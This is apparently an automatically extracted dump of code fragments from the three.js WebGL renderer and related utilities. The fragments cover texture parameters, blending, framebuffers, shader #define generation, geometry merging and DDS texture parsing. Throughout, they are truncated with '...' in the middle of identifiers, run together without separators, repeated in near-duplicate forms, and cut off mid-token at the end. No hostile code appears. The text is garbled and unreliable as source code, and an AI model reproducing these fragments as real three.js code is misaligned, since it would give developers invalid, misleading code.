FILL );_gl.dis ... _FILL )_oldPol ... offset;polygon ... units )( _oldP ... units )_oldPol ... = units_oldPol ...  factor_gl.pol ... nits );_gl.pol ... units )_gl.polygonOffset_oldPol ... factor;_oldPol ...  units;if ( bl ... \r\n\r\n\t\t}blendin ... lendingif ( bl ... \n\r\n\t\t\t}_gl.dis ... LEND );_gl.dis ... BLEND )_gl.BLEND_gl.ena ... LEND );_gl.ena ... BLEND )_gl.ble ... _ADD );_gl.ble ... C_ADD )_gl.blendEquation_gl.FUNC_ADD_gl.ble ... .ONE );_gl.ble ... l.ONE )_gl.blendFunc_gl.SRC_ALPHA_gl.ONE_gl.ble ... OLOR );_gl.ble ... COLOR )_gl.ZERO_gl.ONE ... C_COLOR_gl.SRC_COLOR_gl.ble ... eparate_gl.ble ... LPHA );_gl.ble ... ALPHA )_gl.ONE ... C_ALPHA_oldBle ... ending;_oldBle ... lendingblendEq ... quation_gl.ble ... on ) );_gl.ble ... ion ) )paramTh ... ation )_oldBle ... uation;_oldBle ... quationblendSr ... lendDstblendSr ... lendSrcblendDs ... lendDst_gl.ble ... st ) );_gl.ble ... Dst ) )paramTh ... ndSrc )paramTh ... ndDst )_oldBle ... endSrc;_oldBle ... lendSrc_oldBle ... endDst;_oldBle ... lendDst_oldBle ... = null;_oldBle ...  = null_oldBlendSrc = null;_oldBlendSrc = null_oldBlendDst = null;_oldBlendDst = nullif ( is ... \r\n\r\n\t\t}_gl.tex ... pS ) );_gl.tex ... apS ) )_gl.texParameteri_gl.TEXTURE_WRAP_SparamTh ... wrapS )_gl.tex ... pT ) );_gl.tex ... apT ) )_gl.TEXTURE_WRAP_TparamTh ... wrapT )_gl.tex ... er ) );_gl.tex ... ter ) )_gl.TEX ... _FILTERparamTh ... ilter )_gl.tex ... EDGE );_gl.tex ... _EDGE )_gl.CLAMP_TO_EDGEfilterF ... ilter )if ( _g ... \r\n\r\n\t\t}_glExte ... oatTypetexture ... oatTypetexture ... opy > 1_gl.tex ... py ) );_gl.tex ... opy ) )_gl.texParameterfMath.mi ... tropy )this.setTexture_gl.createTexture()_gl.createTexture_this.i ... res ++;_this.i ... ures ++_gl.act ... slot );_gl.act ...  slot )_gl.activeTexture_gl.TEXTURE0 + slot_gl.TEXTURE0_gl.bin ... ture );_gl.bin ... xture )_gl.bindTexture_gl.TEXTURE_2D_gl.pix ... lipY );_gl.pix ... flipY )_gl.pixelStorei_gl.UNP ... Y_WEBGL_gl.pix ... lpha );_gl.pix ... Alpha )_gl.UNP ... A_WEBGL_gl.pix ... ment );_gl.pix ... nment )_gl.UNPACK_ALIGNMENTvar ima ... type );isImage ... eight )glForma ... ormat )paramTh ... ormat )glType  ... .type )paramTh ... .type )setText ... fTwo );setText ... OfTwo )var mip ... ipmaps;mipmaps ... mipmapsif ( mi ... \r\n\t\t\t\t}mipmaps ... erOfTwomipmaps.length > 0mipmaps.lengthil = mipmaps.lengthmipmap  ... s[ i ];mipmap  ... ps[ i ]mipmaps[ i ]_gl.tex ... data );_gl.tex ... .data )_gl.texImage2Dmipmap.widthmipmap.heightmipmap.dataimage.datatexture ... AFormat_gl.com ... data );_gl.com ... .data )_gl.com ... Image2D{ // re ... \n\r\n\t\t\t}_gl.tex ... pmap );_gl.tex ... ipmap )_gl.tex ... mage );_gl.tex ... image )if ( te ... E_2D );texture ... erOfTwo_gl.gen ... E_2D );_gl.gen ... RE_2D )_gl.generateMipmapif ( te ... date();texture.onUpdatetexture.onUpdate();texture.onUpdate()if ( im ... \r\n\r\n\t\t}image.w ... maxSizeimage.h ... maxSizevar max ... ight );maxDime ... eight )Math.ma ... eight )var new ... sion );newWidt ... nsion )Math.fl ... nsion )image.w ... mensionnewHeig ... nsion )image.h ... mensioncanvas. ... wWidth;canvas. ... ewWidthcanvas. ... Height;canvas. ... wHeightvar ctx ... "2d" );ctx = c ...  "2d" )canvas. ...  "2d" )ctx.dra ... ight );ctx.dra ... eight )ctx.drawImagereturn canvas;! textu ... ureCube_gl.bin ... Cube );_gl.bin ... eCube )_gl.TEXTURE_CUBE_MAPvar isC ... exture;isCompr ... Texturevar cubeImage = [];cubeImage = []if ( _t ... \n\t\t\t\t\t}_this.a ... pressed_this.a ... ubemapscubeIma ... Size );cubeIma ... pSize )cubeImage[ i ]clampTo ... pSize )texture.image[ i ]cubeIma ... e[ i ];cubeIma ... ge[ i ]image = ... ge[ 0 ]cubeImage[ 0 ]if( !is ... \n\t\t\t\t\t}!isCompressed_gl.tex ...  i ] );_gl.tex ... [ i ] )_gl.TEX ... E_X + i_gl.TEX ... ITIVE_XcubeIma ... mipmapsfor( va ... \t\t\t\t\t\t}jl = mipmaps.lengthmipmap  ... s[ j ];mipmap  ... ps[ j ]mipmaps[ j ]if ( te ... \t\t\t\t\t\t}_gl.gen ... _MAP );_gl.gen ... E_MAP )_gl.bindFramebuffer_gl.FRAMEBUFFER_gl.fra ... e, 0 );_gl.fra ... re, 0 )_gl.fra ... xture2D_gl.COL ... CHMENT0_gl.bindRenderbuffer_gl.RENDERBUFFERrenderT ... lBufferrenderT ... hBuffer! rende ... lBuffer{\r\n\r\n\t\t ... */\r\n\t\t}_gl.ren ... ight );_gl.ren ... eight )_gl.ren ... Storage_gl.DEP ... ONENT16_gl.fra ... ffer );_gl.fra ... uffer )_gl.fra ... rbuffer_gl.DEPTH_ATTACHMENT_gl.DEPTH_STENCIL_gl.DEP ... ACHMENT_gl.RGBA4var isC ... Cube );isCube  ... tCube )( rende ... tCube )! rende ... ebufferrenderT ... = true;renderT ...  = truerenderT ... ture();renderT ... xture()var isT ... type );isTarge ... eight )renderTarget.formatrenderTarget.typerenderT ... r = [];renderT ... er = []renderT ... ffer();renderT ... uffer()_gl.cre ... uffer()_gl.cre ... ebuffer_gl.cre ... rbuffer_gl.tex ... null );_gl.tex ...  null )setupFr ...  + i );setupFr ... X + i )setupRe ... rget );setupRe ... arget )if ( is ... _MAP );if ( re ... \r\n\t\t\t\t}renderT ... pthFromrenderT ... buffer;setupFr ... E_2D );setupFr ... RE_2D )if ( re ... \n\t\t\t\t\t}if ( is ... E_2D );_gl.bin ... null );_gl.bin ...  null )var fra ... vx, vy;framebu ... Face ];framebu ... eFace ]renderT ... eFace ]renderT ... ubeFaceframebu ... buffer;framebu ... ebufferwidth = ... .width;width = ... t.widthheight  ... height;height  ... .heightvx = 0;vx = 0vy = 0;vy = 0framebuffer = null;framebuffer = nullwidth = ... tWidth;width = ... rtWidthheight  ... Height;height  ... tHeightvx = _viewportX;vx = _viewportXvy = _viewportY;vy = _viewportYif ( fr ... \r\n\r\n\t\t}_curren ... buffer;_curren ... ebuffer_curren ...  width;_curren ... = width_curren ... height;_curren ...  heightif ( f  ... \r\n\r\n\t\t}f === T ... rFilterf === T ... tFilterreturn _gl.NEAREST;_gl.NEARESTreturn _gl.LINEAR;_gl.LINEARif ( p  ... REPEAT;p === T ... rappingreturn _gl.REPEAT;_gl.REPEATif ( p  ... O_EDGE;return  ... O_EDGE;return  ... REPEAT;_gl.MIRRORED_REPEATif ( p  ... EAREST;p === T ... tFilterreturn  ... EAREST;_gl.NEA ... NEARESTif ( p  ... LINEAR;p === T ... rFilterreturn  ... LINEAR;_gl.NEA ... _LINEAR_gl.LIN ... NEAREST_gl.LIN ... _LINEARif ( p  ... D_BYTE;p === T ... yteTypereturn  ... D_BYTE;_gl.UNSIGNED_BYTEif ( p  ... _4_4_4;p === T ... 444Typereturn  ... _4_4_4;_gl.UNS ... 4_4_4_4if ( p  ... _5_5_1;p === T ... 551Typereturn  ... _5_5_1;_gl.UNS ... 5_5_5_1if ( p  ... _5_6_5;p === T ... 565Typereturn  ... _5_6_5;_gl.UNS ... T_5_6_5if ( p  ... l.BYTE;p === THREE.ByteTypereturn _gl.BYTE;_gl.BYTEif ( p  ... .SHORT;p === T ... ortTypereturn _gl.SHORT;_gl.SHORTif ( p  ... _SHORT;return  ... _SHORT;if ( p  ... gl.INT;p === THREE.IntTypereturn _gl.INT;_gl.INTif ( p  ... ED_INT;p === T ... IntTypereturn  ... ED_INT;if ( p  ... .FLOAT;p === T ... oatTypereturn _gl.FLOAT;if ( p  ... .ALPHA;p === T ... aFormatreturn _gl.ALPHA;_gl.ALPHAif ( p  ... gl.RGB;p === T ... BFormatreturn _gl.RGB;_gl.RGBif ( p  ... l.RGBA;p === T ... AFormatreturn _gl.RGBA;_gl.RGBAif ( p  ... INANCE;p === T ... eFormatreturn  ... INANCE;_gl.LUMINANCEif ( p  ... _ALPHA;return  ... _ALPHA;_gl.LUMINANCE_ALPHAif ( p  ... NC_ADD;p === T ... quationreturn _gl.FUNC_ADD;if ( p  ... BTRACT;return  ... BTRACT;_gl.FUNC_SUBTRACT_gl.FUN ... UBTRACTif ( p  ... l.ZERO;p === T ... oFactorreturn _gl.ZERO;if ( p  ... gl.ONE;p === T ... eFactorreturn _gl.ONE;if ( p  ... _COLOR;p === T ... rFactorreturn  ... _COLOR;p === T ... aFactor_gl.DST_ALPHA_gl.ONE ... T_ALPHA_gl.DST_COLOR_gl.ONE ... T_COLORif ( p  ... TURATE;return  ... TURATE;_gl.SRC ... ATURATE_glExte ... definedif ( p  ... T1_EXT;p === T ... _Formatreturn  ... T1_EXT;_glExte ... XT1_EXTif ( p  ... T3_EXT;return  ... T3_EXT;_glExte ... XT3_EXTif ( p  ... T5_EXT;return  ... T5_EXT;_glExte ... XT5_EXTreturn 1024;var nVe ... TORS );nVertex ... CTORS )_gl.get ... CTORS )_gl.MAX ... VECTORSvar nVe ...  / 4 );nVertex ... ) / 4 )Math.fl ... ) / 4 )( nVert ... 0 ) / 4( nVert ...  - 20 )nVertexUniforms - 20var max ... trices;maxBone ... atricesobject  ... nedMeshmaxBone ... ones );maxBone ... Bones )Math.mi ... Bones )object. ... n.bonesmaxBone ... .lengthconsole ... LE)" );console ... GLE)" )"WebGLR ... ANGLE)""WebGLR ... axBones"WebGLR ...  just ""WebGLR ... .length"WebGLR ... nes - "WebGLRenderer: too many bones - ", this ...  just ", this GPU supports just " (try  ... ANGLE)" (try OpenGL instead of ANGLE)return maxBones;var dirLights = 0;dirLights = 0var pointLights = 0;pointLights = 0var spotLights = 0;spotLights = 0var hemiLights = 0;hemiLights = 0light.o ... = falselight.v ... = falseif ( li ... hts ++;dirLights ++;dirLights ++pointLights ++;pointLights ++spotLights ++;spotLights ++hemiLights ++;hemiLights ++return  ... ghts };{ 'dire ... ights }'direct ... rLights'point' ... tLights'spot': spotLights'hemi': hemiLightsvar maxShadows = 0;maxShadows = 0l++if ( li ... ows ++;maxShadows ++;maxShadows ++return maxShadows;try {\r\n ... \r\n\r\n\t\t}attribu ... r\r\n\t\t\t}{\r\n\t\t\t\t ... r\r\n\t\t\t}alpha: _alphadepth: _depthstencil: _stencilantiali ... tialiaspremult ... edAlpha_gl = _ ... utes );_gl = _ ... butes )_contex ... butes )_canvas ... butes )webglexperimental-webglif ( _g ... \n\r\n\t\t\t}_gl === nullthrow ' ... text.';'Error  ... ntext.'Error creating WebGL context.Error creating WebGL contextcatch ( ... \r\n\r\n\t\t}console ... rror );console ... error )_glExte ... oat' );_glExte ... loat' )_gl.get ... loat' )_gl.getExtension_glExte ... ear' );_glExte ... near' )_gl.get ... near' )'OES_te ... linear'OES_texture_float_linear_glExte ... ves' );_glExte ... ives' )_gl.get ... ives' )'OES_st ... atives'_glExte ... pic' );_glExte ... opic' )_gl.get ... opic' )'EXT_te ... tropic''MOZ_EX ... tropic'MOZ_EXT_texture_filter_anisotropic'WEBKIT ... tropic'WEBKIT_EXT_texture_filter_anisotropic_glExte ... 3tc' );_glExte ... s3tc' )_gl.get ... s3tc' )'WEBGL_ ... e_s3tc''MOZ_WE ... e_s3tc'MOZ_WEBGL_compressed_texture_s3tc'WEBKIT ... e_s3tc'WEBKIT_WEBGL_compressed_texture_s3tc_glExte ... int' );_glExte ... uint' )_gl.get ... uint' )'OES_el ... x_uint'console ... ted.' )'THREE. ... orted.'THREE.WebGLRenderer: Float textures not supported.WebGLRenderer: Float textures not supportedTHREE.WebGLRenderer: Standard derivatives not supported.WebGLRenderer: Standard derivatives not supportedTHREE.WebGLRenderer: Anisotropic texture filtering not supported.WebGLRenderer: Anisotropic texture filtering not supportedTHREE.WebGLRenderer: S3TC compressed textures not supported.WebGLRenderer: S3TC compressed textures not supportedTHREE.WebGLRenderer: elementindex as unsigned integer not supported.WebGLRenderer: elementindex as unsigned integer not supportedif ( _g ... \t}\r\n\t\t}_gl.get ... defined{\r\n\r\n\t\t ... \t}\r\n\t\t}_gl.get ... \n\r\n\t\t\t}return  ... \n\t\t\t\t};"rangeMin"  : 1"rangeMax"  : 1"precision" : 1_glExte ... pth' );_glExte ... epth' )_gl.get ... epth' )EXT_frag_depth_gl.cle ... 0, 1 );_gl.cle ...  0, 1 )_gl.clearDepth( 1 );_gl.clearDepth( 1 )_gl.clearDepth_gl.cle ... l( 0 );_gl.cle ... il( 0 )_gl.clearStencil_gl.dep ... QUAL );_gl.dep ... EQUAL )_gl.depthFunc_gl.LEQUALthis.sh ... ugin();this.sh ... lugin()new THR ... lugin()THREE.S ... pPluginthis.ad ... ugin );this.ad ... lugin )this.ad ... in() );this.ad ... gin() )THREE.SpritePluginTHREE.L ... ePluginTHREE.W ... l;\r\n\r\n}options ...  || {};options ... s || {}options || {}options ... rappingoptions ... definedoptions.wrapSoptions.wrapToptions ... rFilteroptions.magFilteroptions.minFilteroptions ... opy : 1options.anisotropyoptions ... AFormatoptions.formatoptions ... yteTypeoptions.typethis.de ... : true;this.de ...  : truethis.depthBufferoptions ...  : trueoptions.depthBufferthis.st ... : true;this.st ...  : truethis.stencilBufferoptions ... lBufferthis.shareDepthFromTHREE.W ... }\r\n\r\n};THREE.W ... \t}\r\n\r\n}THREE.W ... ototypeconstru ... rTargetvar tmp ... ight );tmp = n ... eight )new THR ... eight )tmp.wra ... .wrapS;tmp.wra ... s.wrapStmp.wrapStmp.wra ... .wrapT;tmp.wra ... s.wrapTtmp.wrapTtmp.mag ... Filter;tmp.mag ... gFiltertmp.magFiltertmp.min ... Filter;tmp.min ... nFiltertmp.minFiltertmp.ani ... otropy;tmp.ani ... sotropytmp.anisotropytmp.off ... fset );tmp.off ... ffset )tmp.offset.copytmp.offsettmp.rep ... peat );tmp.rep ... epeat )tmp.repeat.copytmp.repeattmp.for ... format;tmp.for ... .formattmp.formattmp.typ ... s.type;tmp.type = this.typetmp.typetmp.dep ... Buffer;tmp.dep ... hBuffertmp.depthBuffertmp.ste ... Buffer;tmp.ste ... lBuffertmp.stencilBuffertmp.gen ... ipmaps;tmp.gen ... Mipmapstmp.generateMipmapstmp.sha ... thFrom;tmp.sha ... pthFromtmp.shareDepthFromreturn tmp;THREE.W ... 5\r\n\r\n};THREE.W ...  5\r\n\r\n}functio ...  5\r\n\r\n}{\r\n\r\n\tT ...  5\r\n\r\n}THREE.W ... ions );THREE.W ... tions )THREE.W ... et.callthis.ac ... ce = 0;this.ac ... ace = 0this.activeCubeFaceTHREE.W ... type );THREE.W ... otype )THREE.W ... \n} )();THREE.W ... \r\n} )()var pro ... nt = 0;programIdCount = 0var gen ... \r\n\r\n\t};generat ... ;\r\n\r\n\t}var val ... s = [];value = ... s[ d ];value = defines[ d ]defines[ d ]if ( va ... ntinue;value === falsechunk = ...  value;chunk = ... + value"#defin ... + value"#define " + d + " ""#define " + d#define chunks. ... hunk );chunks.push( chunk )return  ... "\n" );chunks.join( "\n" )var cac ... \r\n\r\n\t};cacheUn ... ;\r\n\r\n\t}cacheUn ... cationsvar uniforms = {};uniforms = {}l = ide ... .lengthidentifiers.lengthvar id  ... s[ i ];id = id ... rs[ i ]identifiers[ i ]uniform ... , id );uniform ... m, id )uniforms[ id ]gl.getU ... m, id )gl.getU ... ocationreturn uniforms;cacheAt ... ;\r\n\r\n\t}cacheAt ... cationsvar attributes = {};attributes = {}attribu ... , id );attribu ... m, id )gl.getA ... m, id )gl.getAttribLocationreturn attributes;var _th ... nderer;_this = renderervar _gl ... ontext;_gl = _this.context_this.contextvar fra ... Shader;var ver ... Shader;var uni ... iforms;var def ... efines;defines ... definesvar ind ... teName;index0A ... uteNamemateria ... uteNameindex0A ... == trueindex0A ... definedparamet ... Targetsindex0A ... ition';index0A ... sition'var sha ... BASIC";shadowM ... _BASIC""SHADOW ... _BASIC"SHADOWMAP_TYPE_BASICparamet ... adowMapparamet ... MapTypeshadowM ... E_PCF";shadowM ... PE_PCF"SHADOWMAP_TYPE_PCFshadowM ... _SOFT";shadowM ... F_SOFT""SHADOW ... F_SOFT"SHADOWMAP_TYPE_PCF_SOFTvar cus ... ines );customD ... fines )generat ... fines )var pro ... gram();program ... ogram()_gl.createProgram()_gl.createProgramvar pre ... agment;prefix_vertex = '';prefix_vertex = ''prefix_ ... t = '';prefix_fragment = ''prefix_ ... '\n' );prefix_ ...  '\n' )[\r\n\r\n\t\t ...  '\n' )[\r\n\r\n\t\t ... \n\r\n\t\t\t]"precis ... float;""precis ... ecisionprecision  float;"precis ... " int;" int;paramet ... S" : ""paramet ... extures"#defin ... XTURES"#define VERTEX_TEXTURES_this.g ... T" : """#defin ... _INPUT"#define GAMMA_INPUT_this.gammaOutput"#defin ... OUTPUT"#define GAMMA_OUTPUT"#defin ... rLights"#defin ... IGHTS "#define MAX_DIR_LIGHTS paramet ... rLights"#defin ... tLights#define MAX_POINT_LIGHTS paramet ... tLights#define MAX_SPOT_LIGHTS "#defin ... iLights#define MAX_HEMI_LIGHTS paramet ... iLights"#defin ... Shadows"#defin ... ADOWS "#define MAX_SHADOWS paramet ... Shadows"#defin ... axBones#define MAX_BONES parameters.maxBonesparamet ... P" : ""parameters.map#define USE_MAPparameters.envMap#define USE_ENVMAPparameters.lightMap"#defin ... GHTMAP"#define USE_LIGHTMAPparameters.bumpMap"#defin ... UMPMAP"#define USE_BUMPMAPparameters.normalMap"#defin ... MALMAP"#define USE_NORMALMAPparamet ... ularMap"#defin ... LARMAP"#define USE_SPECULARMAPparamet ... R" : ""paramet ... xColors#define USE_COLORparamet ... G" : ""parameters.skinning"#defin ... INNING"#define USE_SKINNINGparamet ... E" : """#defin ... EXTURE"#define BONE_TEXTURE"#defin ... ARGETS"#define USE_MORPHTARGETSparamet ... Normals"#defin ... ORMALS"#define USE_MORPHNORMALSparamet ... D" : ""paramet ... pAround"#defin ... AROUND"#define WRAP_AROUNDparamet ... leSided"#defin ... _SIDED"#define DOUBLE_SIDEDparameters.flipSided#define FLIP_SIDEDparamet ... Enabled"#defin ... DOWMAP"#define USE_SHADOWMAPparamet ... ne : """#defin ... eDefineparamet ... apDebug"#defin ... _DEBUG"#define SHADOWMAP_DEBUGparamet ... Cascade"#defin ... ASCADE"#define SHADOWMAP_CASCADEparamet ... N" : ""paramet ... nuation"#defin ... UATION"#define USE_SIZEATTENUATIONparamet ... F" : """#defin ... PTHBUF"#define USE_LOGDEPTHBUF"unifor ... atrix;"uniform mat4 modelMatrix;uniform mat4 modelViewMatrix;uniform mat4 projectionMatrix;uniform mat4 viewMatrix;uniform mat3 normalMatrix;"unifor ... ition;"uniform vec3 cameraPosition;"attrib ... ition;"attribute vec3 position;"attrib ... ormal;"attribute vec3 normal;attribute vec2 uv;"attrib ... 2 uv2;"attribute vec2 uv2;"\tattri ... color;"	attribute vec3 color;"\tattri ... rget0;"	attribute vec3 morphTarget0;"\tattri ... rget1;"	attribute vec3 morphTarget1;"\tattri ... rget2;"	attribute vec3 morphTarget2;"\tattri ... rget3;"	attribute vec3 morphTarget3;"\t\tattr ... rmal0;"		attribute vec3 morphNormal0;"\t\tattr ... rmal1;"		attribute vec3 morphNormal1;"\t\tattr ... rmal2;"		attribute vec3 morphNormal2;"\t\tattr ... rmal3;"		attribute vec3 morphNormal3;"\t\tattr ... rget4;"		attribute vec3 morphTarget4;"\t\tattr ... rget5;"		attribute vec3 morphTarget5;"\t\tattr ... rget6;"		attribute vec3 morphTarget6;"\t\tattr ... rget7;"		attribute vec3 morphTarget7;"\tattri ... Index;"	attribute vec4 skinIndex;"\tattri ... eight;"	attribute vec4 skinWeight;( param ... e" : ""( param ... alMap )paramet ... rmalMap"#exten ... enable"#extension GL_OES_standard_derivatives : enableparamet ... est: ""parameters.alphaTest"#defin ... phaTest#define ALPHATEST ( param ... G" : ""( param ... s.fog )paramet ... ers.fogparameters.useFogparameters.fog#define USE_FOG( param ... 2" : ""( param ... ogExp )paramet ... .fogExpparameters.fogExp#define FOG_EXP2paramet ... L" : ""parameters.metal#define METALvar glV ... ader );glVerte ... hader )THREE.WebGLShaderprefix_ ... xShadervar glF ... ader );glFragm ... hader )prefix_ ... tShader_gl.att ... ader );_gl.att ... hader )_gl.attachShader_gl.bin ... Name );_gl.bin ... eName )_gl.bin ... ocation_gl.lin ... gram );_gl.lin ... ogram )_gl.linkProgram_gl.get ... = false_gl.get ... TATUS )_gl.get ... rameter_gl.LINK_STATUSconsole ... der' );console ... ader' )'Could  ... shader'Could not initialise shaderconsole ... US ) );console ... TUS ) )gl.VALIDATE_STATUS_gl.VALIDATE_STATUSconsole ... or() );console ... ror() )gl.getError()_gl.getError()_gl.getError_gl.get ...  !== ''_gl.get ... ogram )_gl.get ... InfoLogconsole ... am ) );console ... ram ) )'gl.get ... oLog()'gl.getProgramInfoLog()_gl.del ... ader );_gl.del ... hader )_gl.deleteShadervar ide ... \n\r\n\t\t];identif ... \r\n\r\n\t\t]'morphT ... uences'identif ... ure' );identif ... ture' )identifiers.pushidentif ... dth' );identif ... idth' )identif ... ght' );identif ... ight' )identif ... ces' );identif ... ices' )identif ... ufFC');identif ... BufFC')var uidentif ... h( u );identif ... sh( u )this.un ... iers );this.un ... fiers )cacheUn ... fiers )identif ... \n\r\n\t\t];i < par ... Targetsidentif ...  + i );identif ... " + i )"morphTarget" + ii < par ... Normals"morphNormal" + iidentif ... h( a );identif ... sh( a )this.at ... iers );this.at ... fiers )cacheAt ... fiers )programIdCount ++this.code = code;this.code = codethis.usedTimes = 1;this.usedTimes = 1this.usedTimesthis.pr ... rogram;this.pr ... programthis.ve ... Shader;this.ve ... xShaderthis.fr ... Shader;this.fr ... tShadervar add ... \r\n\r\n\t};addLine ... ;\r\n\r\n\t}var lin ... '\n' );lines = ...  '\n' )string.split( '\n' )string.spliti < lines.lengthlines.lengthlines[  ... s[ i ];lines[  ... es[ i ]lines[ i ]( i + 1 ... es[ i ]( i + 1 ) + ': '( i + 1 )return  ... '\n' );lines.join( '\n' )lines.joinvar sha ... type );shader  ...  type )gl.crea ...  type )gl.createShadergl.shad ... ring );gl.shad ... tring )gl.shaderSourcegl.comp ... ader );gl.comp ... hader )gl.compileShaderif ( gl ... \r\n\r\n\t\t}gl.getS ... = falsegl.getS ... TATUS )gl.getS ... rametergl.COMPILE_STATUSconsole ... le.' );console ... ile.' )'THREE. ... mpile.'THREE.WebGLShader: Shader couldn't compile.WebGLShader: Shader couldn't compilegl.getS ...  !== ''gl.getS ... hader )gl.getShaderInfoLogconsole ... er ) );console ... der ) )THREE.WebGLShader:WebGLShader:gl.getShaderInfoLog()console ... ng ) );console ... ing ) )addLine ... tring )return shader;this.positionWorldthis.po ... tor4();this.po ... ctor4()this.positionScreenTHREE.R ... pe.copythis.po ... orld );this.po ... World )this.po ... ld.copythis.po ... reen );this.po ... creen )this.po ... en.copyTHREE.R ... 0;\r\n\r\n}this.id = 0;this.id = 0this.v1 ... rtex();this.v1 ... ertex()this.v1this.v2 ... rtex();this.v2 ... ertex()this.v2this.v3 ... rtex();this.v3 ... ertex()this.v3this.normalModelthis.ve ... r3() ];this.ve ... or3() ]this.ve ... lsModel[ new T ... or3() ]this.ve ... th = 0;this.ve ... gth = 0this.ve ... sLengththis.color = null;this.color = nullthis.ma ... = null;this.material = nullthis.uv ... r2() ];this.uv ... or2() ]this.uvs[ new T ... or2() ]this.object = null;this.object = nullthis.sc ... tor2();this.sc ... ctor2()this.ve ... or() ];this.ve ... lor() ][ new T ... lor() ]THREE.GeometryUtilsDEPRECATED: GeometryUtils's .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.DEPRECATED: GeometryUtils's  has been moved to Geometry Use geometry( geometry2, matrix, materialIndexOffset ) geometry2, matrix, materialIndexOffset var matrix;geometr ... EE.Meshgeometr ... trix();geometr ... atrix()geometr ... oUpdategeometr ... eMatrixmatrix  ... matrix;matrix  ... .matrixgeometry2.matrixgeometry2.geometrygeometr ... fset );geometr ... ffset )geometry1.mergerandomP ... \n\r\n\t}()randomP ... rianglevar poi ... tor3();point = ... ctor3()var a = ... om16();a = THR ... dom16()THREE.M ... dom16()THREE.Math.random16var b = ... om16();b = THR ... dom16()( a + b ) > 1( a + b )a = 1 - a;a = 1 - a1 - ab = 1 - b;b = 1 - b1 - bvar c = 1 - a - b;c = 1 - a - b1 - a - bpoint.c ... torA );point.c ... ctorA )point.copypoint.m ... r( a );point.m ... ar( a )point.multiplyScalarvector. ... torB );vector. ... ctorB )vector.copyvector. ... r( b );vector. ... ar( b )vector. ... yScalarpoint.add( vector );point.add( vector )point.addvector. ... torC );vector. ... ctorC )vector. ... r( c );vector. ... ar( c )return point;randomP ... ;\r\n\r\n\t}var vA, vB, vC;vA = ge ... ce.a ];vA = ge ... ace.a ]geometr ... ace.a ]vB = ge ... ce.b ];vB = ge ... ace.b ]geometr ... ace.b ]vC = ge ... ce.c ];vC = ge ... ace.c ]geometr ... ace.c ]return  ... , vC );THREE.G ... B, vC )THREE.G ... rianglerandomP ... eometryvar fac ... vC, vD;totalArea = 0cumulativeAreas = []face = faces[ i ];face = faces[ i ]vA = ve ... ce.a ];vA = ve ... ace.a ]vB = ve ... ce.b ];vB = ve ... ace.b ]vC = ve ... ce.c ];vC = ve ... ace.c ]face._a ... , vC );face._a ... B, vC )face._areaTHREE.G ... gleAreatotalAr ... ._area;totalAr ... e._areacumulat ... alArea;cumulat ... talAreacumulativeAreas[ i ]if ( en ...  start;end < startreturn start;var mid ...  / 2 );mid = s ... ) / 2 )start + ... ) / 2 )Math.fl ... ) / 2 )( end - start ) / 2( end - start )end - startcumulat ... > valuecumulat ... [ mid ]binaryS ... d - 1 )mid - 1cumulat ... < valuebinaryS ... , end )mid + 1return mid;var res ... h - 1 )result  ... h - 1 )binaryS ... h - 1 )cumulat ... gth - 1cumulat ... .lengthvar r,  ... t = [];result = []var stats = {};stats = {}i < nr = THR ... alArea;r = THR ... talAreaTHREE.M ... talAreaindex = ... s( r );index = ... es( r )binaryS ... es( r )result[ ... true );result[ ...  true )result[ i ]THREE.G ...  true )THREE.G ... tInFacefaces[ index ]! stats[ index ]stats[ index ]stats[ index ] = 1;stats[ index ] = 1stats[ index ] += 1;stats[ index ] += 1triangl ... \n\r\n\t}()vector1 ... ctor3()vector2 ... ctor3()vector1 ... torA );vector1 ... ctorA )vector1.subVectorsvector2 ... torA );vector2 ... ctorA )vector2.subVectorsvector1 ... tor2 );vector1 ... ctor2 )vector1.cross0.5 * v ... ength()vector1.length()vector1.lengthgeometr ... gBox();geometr ... ngBox()geometr ... dingBoxbb = ge ... dingBoxvar off ... tor3();offset  ... ctor3()offset. ... .max );offset. ... b.max )offset.addVectorsoffset. ... -0.5 );offset. ...  -0.5 )offset. ... yScalar-0.5geometr ... .z ) );geometr ... t.z ) )geometry.applyMatrixnew THR ... set.z )new THR ... slationreturn offset;THREE.I ... }\r\n\r\n};loadTex ... ;\r\n\r\n\t}loader. ... Origin;loader.crossOriginvar tex ... ping );texture ... pping )new THR ... pping )var ima ... \n\t\t} );image = ... \r\n\t\t} )if ( on ... ture );if ( on ... vent );texture ...  = url;texture ... e = urltexture.sourceFileloadCom ... ;\r\n\r\n\t}request ... \r\n\r\n\t\t}request.onloadvar buf ... sponse;buffer  ... esponserequest.responsevar dds ... true );dds = T ...  true )THREE.I ...  true )THREE.I ... arseDDSdds.formattexture ... mipmapsdds.mipmapstexture ... .width;texture ... s.widthdds.widthtexture ... .heightdds.heightrequest ... nError;request ... onErrorrequest.onerrorrequest ... uffer";request ... buffer"request.responseTypearraybuffervar images = [];images = []images. ... nt = 0;images.loadCount = 0images.loadCounttexture ... images;texture ...  imagesif ( ma ... apping;for ( v ... e;\r\n\t\t}il = array.lengthvar cub ... \t\t\t} );cubeIma ... \n\t\t\t} )loader. ... \n\t\t\t} )array[i]images. ... t += 1;images. ... nt += 1if ( im ... \r\n\t\t\t\t}images. ... t === 6images[ ... eImage;images[ ... beImageimages[ i ]var gen ... \r\n\r\n\t\t}buffer = rq.responserq.responseimg.for ... format;img.for ... .formatimg.formatimg.mip ... ipmaps;img.mip ... mipmapsimg.mipmapsimg.wid ... .width;img.wid ... s.widthimg.widthimg.hei ... height;img.hei ... .heightimg.heightarray i ... f Arrayvar cubeImage = {};cubeImage = {}request ... mage );request ... Image )generat ... Image )var url ... y[ i ];url = array[ i ]var url = array;url = arrayrequest ... \n\r\n\t\t\t}if ( dd ... \r\n\t\t\t\t}dds.isCubemapvar fac ... pCount;faces = ... apCountdds.mip ... apCountdds.mipmaps.lengthdds.mipmapCountf < facesvar f = 0images[ ... : [] };images[ ...  : [] }images[ f ]{ mipmaps : [] }mipmaps : []i < dds.mipmapCountimages[ ...  i ] );images[ ... + i ] )images[ ... ps.pushimages[ f ].mipmapsdds.mip ... t + i ]f * dds ... unt + if * dds.mipmapCountimages[ ... format;images[ ... .formatimages[ f ].formatimages[ ... .width;images[ ... s.widthimages[ f ].widthimages[ ... height;images[ ... .heightimages[ f ].heightloadDDS ... ;\r\n\r\n\t}parseDD ... ;\r\n\r\n\t}var dds ... t: 1 };dds = { ... nt: 1 }{ mipma ... nt: 1 }mipmaps: []width: 0height: 0format: nullmipmapCount: 1var DDS ... 534444;DDS_MAG ... 0534444542327876var DDS 